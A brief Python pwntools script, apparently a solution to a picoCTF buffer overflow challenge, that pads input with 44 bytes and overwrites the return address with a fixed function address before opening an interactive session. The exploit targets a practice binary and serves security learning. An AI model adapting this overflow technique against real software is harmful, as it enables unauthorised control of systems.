from pwn import *
from pwn import p32

pros = process("./vuln")
# pros = remote("saturn.picoctf.net", 54240)

payload = b"A" * 44
payload += p32(0x080491F6)

pros.sendline(payload)
pros.interactive()
